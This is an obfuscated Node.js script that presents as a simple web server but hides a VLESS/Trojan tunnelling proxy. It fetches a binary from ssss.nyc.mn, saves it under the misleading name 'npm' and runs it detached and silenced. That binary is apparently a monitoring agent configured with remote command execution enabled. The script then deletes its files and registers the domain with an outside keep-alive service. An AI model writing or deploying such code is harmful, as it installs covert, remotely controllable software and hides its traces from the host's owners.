const _0x529fbf=_0x79b3;(function(_0x5292a1,_0x2ed9a3){const _0x852639=_0x79b3,_0x2952ff=_0x5292a1();while(!![]){try{const _0x12c56e=-parseInt(_0x852639(0x8c))/0x1*(-parseInt(_0x852639(0x8d))/0x2)+parseInt(_0x852639(0xa5))/0x3*(-parseInt(_0x852639(0x7a))/0x4)+-parseInt(_0x852639(0x83))/0x5+-parseInt(_0x852639(0x9f))/0x6*(parseInt(_0x852639(0xca))/0x7)+-parseInt(_0x852639(0xa2))/0x8*(-parseInt(_0x852639(0x7b))/0x9)+-parseInt(_0x852639(0x88))/0xa*(-parseInt(_0x852639(0x93))/0xb)+parseInt(_0x852639(0xa4))/0xc;if(_0x12c56e===_0x2ed9a3)break;else _0x2952ff['push'](_0x2952ff['shift']());}catch(_0x4f61e0){_0x2952ff['push'](_0x2952ff['shift']());}}}(_0x11c2,0xb6226));const os=require('os'),http=require(_0x529fbf(0xe6)),fs=require('fs'),axios=require(_0x529fbf(0xc5)),net=require(_0x529fbf(0xef)),path=require(_0x529fbf(0xd4)),crypto=require(_0x529fbf(0xec)),{Buffer}=require(_0x529fbf(0xda)),{exec,execSync}=require(_0x529fbf(0x84)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x529fbf(0xbc)]['UUID']||_0x529fbf(0x9d),NEZHA_SERVER=process['env'][_0x529fbf(0xc8)]||'',NEZHA_PORT=process[_0x529fbf(0xbc)][_0x529fbf(0x8a)]||'',NEZHA_KEY=process['env'][_0x529fbf(0x81)]||'',DOMAIN=process[_0x529fbf(0xbc)][_0x529fbf(0xd2)]||_0x529fbf(0x91),AUTO_ACCESS=process[_0x529fbf(0xbc)][_0x529fbf(0xbd)]||!![],WSPATH=process[_0x529fbf(0xbc)][_0x529fbf(0xc0)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x529fbf(0xd7),NAME=process[_0x529fbf(0xbc)]['NAME']||_0x529fbf(0xeb),PORT=process[_0x529fbf(0xbc)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x549213=_0x529fbf;try{const _0x1db27d=await axios[_0x549213(0xa1)](_0x549213(0xbb)),_0x5cd32d=_0x1db27d[_0x549213(0xdc)];ISP=(_0x5cd32d['country']+'-'+_0x5cd32d['asOrganization'])[_0x549213(0x79)](/ /g,'_');}catch(_0x1dec45){ISP=_0x549213(0x98);}};function _0x79b3(_0x3e1923,_0x26d899){_0x3e1923=_0x3e1923-0x75;const _0x11c243=_0x11c2();let _0x79b39a=_0x11c243[_0x3e1923];return _0x79b39a;}function _0x11c2(){const _0x249bc3=['stream','writeFileSync','&path=%2F','0614a4fa-1fd4-4afb-b607-11d8dd8fc0ee','config.yaml','6888AYNYeb','base64','get','8wVkTPO','\x20with\x20all\x20DNS\x20servers','5497356ZxunUJ','127299NCDDdd','text/html','log','test','client_secret:\x20','2096','arm','https://amd64.ssss.nyc.mn/agent','url','end','update','finish','8.8.4.4','slice','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://dns.google/resolve?name=','error:\x20','Server\x20is\x20running\x20on\x20port\x20','readFile','write','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Answer','https://speed.cloudflare.com/meta','env','AUTO_ACCESS','readUInt8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','WSPATH','application/json','post','trim','reduce','axios','npm\x20download\x20successfully','catch','NEZHA_SERVER','includes','4228xiycKG','npm','index.html','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2083','443','toString','https://','DOMAIN','digest','path','join','Failed\x20to\x20resolve\x20','123@123','listen','2053','buffer','text/plain','data','every','createHash','utf8','from','then','1.1.1.1','chmod\x20+x\x20npm','npm\x20is\x20running','vless://','http','Hello\x20world!','unlink','--tls','decode','Hug','crypto','error','readUInt16BE','net','connect','length','2087','&type=A','createWriteStream','arch','map','connection','replace','28uQtqse','2538369Zkllmy','writeHead','application/dns-json','false',':443?security=tls&sni=','type','NEZHA_KEY','substr','1727050JMlKBN','child_process','Not\x20Found\x0a','concat','createServer','337010NNFBup','&fp=chrome&type=ws&host=','NEZHA_PORT','\x20-p\x20','129799NxnnfS','16fHjXqo','npm\x20running\x20error:','split','close','1234.abc.com','8443','99OaJmhK','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Status','aarch64','send','Unknown','pipe'];_0x11c2=function(){return _0x249bc3;};return _0x11c2();}GetISP();const httpServer=http[_0x529fbf(0x87)]((_0x1f2d13,_0x205c88)=>{const _0x1a517e=_0x529fbf;if(_0x1f2d13['url']==='/'){const _0x4bb0c7=path[_0x1a517e(0xd5)](__dirname,_0x1a517e(0xcc));fs[_0x1a517e(0xb7)](_0x4bb0c7,_0x1a517e(0xdf),(_0x592834,_0x326b8a)=>{const _0xd37efd=_0x1a517e;if(_0x592834){_0x205c88['writeHead'](0xc8,{'Content-Type':_0xd37efd(0xa6)}),_0x205c88[_0xd37efd(0xae)](_0xd37efd(0xe7));return;}_0x205c88[_0xd37efd(0x7c)](0xc8,{'Content-Type':_0xd37efd(0xa6)}),_0x205c88[_0xd37efd(0xae)](_0x326b8a);});return;}else{if(_0x1f2d13['url']==='/'+SUB_PATH){const _0x2ca274=_0x1a517e(0xe5)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x1a517e(0x89)+DOMAIN+_0x1a517e(0x9c)+WSPATH+'#'+NAME+'-'+ISP,_0x300870='trojan://'+UUID+'@'+DOMAIN+_0x1a517e(0x7f)+DOMAIN+_0x1a517e(0x89)+DOMAIN+_0x1a517e(0x9c)+WSPATH+'#'+NAME+'-'+ISP,_0x24b81b=_0x2ca274+'\x0a'+_0x300870,_0x13d247=Buffer[_0x1a517e(0xe0)](_0x24b81b)[_0x1a517e(0xd0)](_0x1a517e(0xa0));_0x205c88['writeHead'](0xc8,{'Content-Type':_0x1a517e(0xdb)}),_0x205c88[_0x1a517e(0xae)](_0x13d247+'\x0a');}else _0x205c88['writeHead'](0x194,{'Content-Type':_0x1a517e(0xdb)}),_0x205c88['end'](_0x1a517e(0x85));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x529fbf(0x79)](/-/g,''),DNS_SERVERS=[_0x529fbf(0xb1),_0x529fbf(0xe2)];function resolveHost(_0x363b57){return new Promise((_0x39a2aa,_0x17e0ef)=>{const _0x38d40e=_0x79b3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x38d40e(0xa8)](_0x363b57)){_0x39a2aa(_0x363b57);return;}let _0x4ea59a=0x0;function _0x25a997(){const _0x1e58c9=_0x38d40e;if(_0x4ea59a>=DNS_SERVERS['length']){_0x17e0ef(new Error(_0x1e58c9(0xd6)+_0x363b57+_0x1e58c9(0xa3)));return;}const _0x4b8c55=DNS_SERVERS[_0x4ea59a];_0x4ea59a++;const _0x10fba6=_0x1e58c9(0xb4)+encodeURIComponent(_0x363b57)+_0x1e58c9(0xf3);axios[_0x1e58c9(0xa1)](_0x10fba6,{'timeout':0x1388,'headers':{'Accept':_0x1e58c9(0x7d)}})[_0x1e58c9(0xe1)](_0x413df4=>{const _0x20e10e=_0x1e58c9,_0x3c8497=_0x413df4['data'];if(_0x3c8497[_0x20e10e(0x95)]===0x0&&_0x3c8497[_0x20e10e(0xba)]&&_0x3c8497[_0x20e10e(0xba)]['length']>0x0){const _0x323011=_0x3c8497[_0x20e10e(0xba)]['find'](_0x149113=>_0x149113[_0x20e10e(0x80)]===0x1);if(_0x323011){_0x39a2aa(_0x323011[_0x20e10e(0xdc)]);return;}}_0x25a997();})[_0x1e58c9(0xc7)](_0x4d2dd3=>{_0x25a997();});}_0x25a997();});}function handleVlessConnection(_0x29ae22,_0x379031){const _0x588025=_0x529fbf,[_0x45bac3]=_0x379031,_0x199aa0=_0x379031[_0x588025(0xb2)](0x1,0x11);if(!_0x199aa0[_0x588025(0xdd)]((_0x1280b2,_0x349208)=>_0x1280b2==parseInt(uuid['substr'](_0x349208*0x2,0x2),0x10)))return![];let _0x3a8c43=_0x379031[_0x588025(0xb2)](0x11,0x12)[_0x588025(0xbe)]()+0x13;const _0x54f2c8=_0x379031['slice'](_0x3a8c43,_0x3a8c43+=0x2)[_0x588025(0xee)](0x0),_0x1e55c5=_0x379031[_0x588025(0xb2)](_0x3a8c43,_0x3a8c43+=0x1)[_0x588025(0xbe)](),_0x352668=_0x1e55c5==0x1?_0x379031[_0x588025(0xb2)](_0x3a8c43,_0x3a8c43+=0x4)[_0x588025(0xd5)]('.'):_0x1e55c5==0x2?new TextDecoder()[_0x588025(0xea)](_0x379031[_0x588025(0xb2)](_0x3a8c43+0x1,_0x3a8c43+=0x1+_0x379031[_0x588025(0xb2)](_0x3a8c43,_0x3a8c43+0x1)[_0x588025(0xbe)]())):_0x1e55c5==0x3?_0x379031['slice'](_0x3a8c43,_0x3a8c43+=0x10)[_0x588025(0xc4)]((_0xfb629d,_0x4c70b0,_0x3e7226,_0x57b2be)=>_0x3e7226%0x2?_0xfb629d['concat'](_0x57b2be[_0x588025(0xb2)](_0x3e7226-0x1,_0x3e7226+0x1)):_0xfb629d,[])[_0x588025(0x77)](_0x28e261=>_0x28e261[_0x588025(0xee)](0x0)[_0x588025(0xd0)](0x10))[_0x588025(0xd5)](':'):'';_0x29ae22[_0x588025(0x97)](new Uint8Array([_0x45bac3,0x0]));const _0x5c1344=createWebSocketStream(_0x29ae22);return resolveHost(_0x352668)[_0x588025(0xe1)](_0x3945cd=>{net['connect']({'host':_0x3945cd,'port':_0x54f2c8},function(){const _0x17681c=_0x79b3;this['write'](_0x379031[_0x17681c(0xb2)](_0x3a8c43)),_0x5c1344['on'](_0x17681c(0xed),()=>{})[_0x17681c(0x99)](this)['on'](_0x17681c(0xed),()=>{})[_0x17681c(0x99)](_0x5c1344);})['on']('error',()=>{});})[_0x588025(0xc7)](_0x5c9d23=>{const _0x2ee349=_0x588025;net[_0x2ee349(0xf0)]({'host':_0x352668,'port':_0x54f2c8},function(){const _0x32d9db=_0x2ee349;this[_0x32d9db(0xb8)](_0x379031[_0x32d9db(0xb2)](_0x3a8c43)),_0x5c1344['on'](_0x32d9db(0xed),()=>{})[_0x32d9db(0x99)](this)['on'](_0x32d9db(0xed),()=>{})[_0x32d9db(0x99)](_0x5c1344);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2efe91,_0x36d245){const _0x353f71=_0x529fbf;try{if(_0x36d245[_0x353f71(0xf1)]<0x3a)return![];const _0x134c28=_0x36d245[_0x353f71(0xb2)](0x0,0x38)[_0x353f71(0xd0)](),_0x4d7d6e=[UUID];let _0x19ae9f=null;for(const _0x1cd838 of _0x4d7d6e){const _0x42dcc5=crypto[_0x353f71(0xde)]('sha224')[_0x353f71(0xaf)](_0x1cd838)[_0x353f71(0xd3)]('hex');if(_0x42dcc5===_0x134c28){_0x19ae9f=_0x1cd838;break;}}if(!_0x19ae9f)return![];let _0x48a72c=0x38;_0x36d245[_0x48a72c]===0xd&&_0x36d245[_0x48a72c+0x1]===0xa&&(_0x48a72c+=0x2);const _0x5a5515=_0x36d245[_0x48a72c];if(_0x5a5515!==0x1)return![];_0x48a72c+=0x1;const _0x792fca=_0x36d245[_0x48a72c];_0x48a72c+=0x1;let _0x400e7f,_0x15a1a3;if(_0x792fca===0x1)_0x400e7f=_0x36d245[_0x353f71(0xb2)](_0x48a72c,_0x48a72c+0x4)[_0x353f71(0xd5)]('.'),_0x48a72c+=0x4;else{if(_0x792fca===0x3){const _0x125d4a=_0x36d245[_0x48a72c];_0x48a72c+=0x1,_0x400e7f=_0x36d245[_0x353f71(0xb2)](_0x48a72c,_0x48a72c+_0x125d4a)[_0x353f71(0xd0)](),_0x48a72c+=_0x125d4a;}else{if(_0x792fca===0x4)_0x400e7f=_0x36d245[_0x353f71(0xb2)](_0x48a72c,_0x48a72c+0x10)[_0x353f71(0xc4)]((_0x10ef98,_0x45e901,_0x3e5d89,_0xfd3b9e)=>_0x3e5d89%0x2?_0x10ef98[_0x353f71(0x86)](_0xfd3b9e[_0x353f71(0xb2)](_0x3e5d89-0x1,_0x3e5d89+0x1)):_0x10ef98,[])[_0x353f71(0x77)](_0x5a454f=>_0x5a454f[_0x353f71(0xee)](0x0)['toString'](0x10))[_0x353f71(0xd5)](':'),_0x48a72c+=0x10;else return![];}}_0x15a1a3=_0x36d245['readUInt16BE'](_0x48a72c),_0x48a72c+=0x2;_0x48a72c<_0x36d245[_0x353f71(0xf1)]&&_0x36d245[_0x48a72c]===0xd&&_0x36d245[_0x48a72c+0x1]===0xa&&(_0x48a72c+=0x2);const _0x46c996=createWebSocketStream(_0x2efe91);return resolveHost(_0x400e7f)[_0x353f71(0xe1)](_0x5335ab=>{const _0x736ed2=_0x353f71;net[_0x736ed2(0xf0)]({'host':_0x5335ab,'port':_0x15a1a3},function(){const _0x36c572=_0x736ed2;_0x48a72c<_0x36d245[_0x36c572(0xf1)]&&this[_0x36c572(0xb8)](_0x36d245[_0x36c572(0xb2)](_0x48a72c)),_0x46c996['on']('error',()=>{})[_0x36c572(0x99)](this)['on'](_0x36c572(0xed),()=>{})[_0x36c572(0x99)](_0x46c996);})['on'](_0x736ed2(0xed),()=>{});})[_0x353f71(0xc7)](_0x58a9ff=>{const _0x2b544f=_0x353f71;net[_0x2b544f(0xf0)]({'host':_0x400e7f,'port':_0x15a1a3},function(){const _0x4948d1=_0x2b544f;_0x48a72c<_0x36d245[_0x4948d1(0xf1)]&&this[_0x4948d1(0xb8)](_0x36d245[_0x4948d1(0xb2)](_0x48a72c)),_0x46c996['on'](_0x4948d1(0xed),()=>{})[_0x4948d1(0x99)](this)['on']('error',()=>{})[_0x4948d1(0x99)](_0x46c996);})['on'](_0x2b544f(0xed),()=>{});}),!![];}catch(_0x43f5ac){return![];}}wss['on'](_0x529fbf(0x78),(_0x19191,_0x5324be)=>{const _0x19e544=_0x529fbf,_0x8b4902=_0x5324be[_0x19e544(0xad)]||'';_0x19191['once']('message',_0x3ebc36=>{const _0x26eae5=_0x19e544;if(_0x3ebc36[_0x26eae5(0xf1)]>0x11&&_0x3ebc36[0x0]===0x0){const _0x36baa5=_0x3ebc36[_0x26eae5(0xb2)](0x1,0x11),_0x1fb7e6=_0x36baa5[_0x26eae5(0xdd)]((_0xa25118,_0x4a56b0)=>_0xa25118==parseInt(uuid[_0x26eae5(0x82)](_0x4a56b0*0x2,0x2),0x10));if(_0x1fb7e6){!handleVlessConnection(_0x19191,_0x3ebc36)&&_0x19191[_0x26eae5(0x90)]();return;}}!handleTrojanConnection(_0x19191,_0x3ebc36)&&_0x19191[_0x26eae5(0x90)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3b17fa=_0x529fbf,_0x2c71a8=os[_0x3b17fa(0x76)]();return _0x2c71a8===_0x3b17fa(0xab)||_0x2c71a8==='arm64'||_0x2c71a8===_0x3b17fa(0x96)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3b17fa(0xac);},downloadFile=async()=>{const _0x2d4d87=_0x529fbf;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4b1600=getDownloadUrl(),_0x126d41=await axios({'method':_0x2d4d87(0xa1),'url':_0x4b1600,'responseType':_0x2d4d87(0x9a)}),_0x4e64e9=fs[_0x2d4d87(0x75)](_0x2d4d87(0xcb));return _0x126d41[_0x2d4d87(0xdc)][_0x2d4d87(0x99)](_0x4e64e9),new Promise((_0x527659,_0x574103)=>{const _0x1b1867=_0x2d4d87;_0x4e64e9['on'](_0x1b1867(0xb0),()=>{const _0x36a77e=_0x1b1867;console[_0x36a77e(0xa7)](_0x36a77e(0xc6)),exec(_0x36a77e(0xe3),_0x1c4123=>{if(_0x1c4123)_0x574103(_0x1c4123);_0x527659();});}),_0x4e64e9['on'](_0x1b1867(0xed),_0x574103);});}catch(_0x38cabf){throw _0x38cabf;}},runnz=async()=>{const _0x388596=_0x529fbf;try{const _0x4a5db2=execSync(_0x388596(0xcd),{'encoding':'utf-8'});if(_0x4a5db2[_0x388596(0xc3)]()!==''){console[_0x388596(0xa7)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2328d1){}await downloadFile();let _0x3ed029='',_0x50f219=[_0x388596(0xcf),_0x388596(0x92),_0x388596(0xaa),_0x388596(0xf2),_0x388596(0xce),_0x388596(0xd9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2de641=_0x50f219[_0x388596(0xc9)](NEZHA_PORT)?_0x388596(0xe9):'';_0x3ed029='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x388596(0x8b)+NEZHA_KEY+'\x20'+_0x2de641+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f0c6d=NEZHA_SERVER[_0x388596(0xc9)](':')?NEZHA_SERVER[_0x388596(0x8f)](':')['pop']():'',_0x400fb2=_0x50f219[_0x388596(0xc9)](_0x4f0c6d)?'true':_0x388596(0x7e),_0x2d672a=_0x388596(0xa9)+NEZHA_KEY+_0x388596(0xb3)+NEZHA_SERVER+_0x388596(0x94)+_0x400fb2+_0x388596(0xb9)+UUID;fs[_0x388596(0x9b)](_0x388596(0x9e),_0x2d672a);}_0x3ed029=_0x388596(0xbf);}else{console[_0x388596(0xa7)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3ed029,{'shell':'/bin/bash'},_0x356c63=>{const _0x1eb75f=_0x388596;if(_0x356c63)console['error'](_0x1eb75f(0x8e),_0x356c63);else console[_0x1eb75f(0xa7)](_0x1eb75f(0xe4));});}catch(_0x50b986){console[_0x388596(0xed)](_0x388596(0xb5)+_0x50b986);}};async function addAccessTask(){const _0x1acb21=_0x529fbf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5e4aeb=_0x1acb21(0xd1)+DOMAIN;try{const _0x22d82c=await axios[_0x1acb21(0xc2)]('https://oooo.serv00.net/add-url',{'url':_0x5e4aeb},{'headers':{'Content-Type':_0x1acb21(0xc1)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5777c1){}}const delFiles=()=>{const _0x4f1628=_0x529fbf;fs[_0x4f1628(0xe8)](_0x4f1628(0xcb),()=>{}),fs[_0x4f1628(0xe8)](_0x4f1628(0x9e),()=>{});};httpServer[_0x529fbf(0xd8)](PORT,()=>{const _0x2f5c45=_0x529fbf;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2f5c45(0xa7)](_0x2f5c45(0xb6)+PORT);});
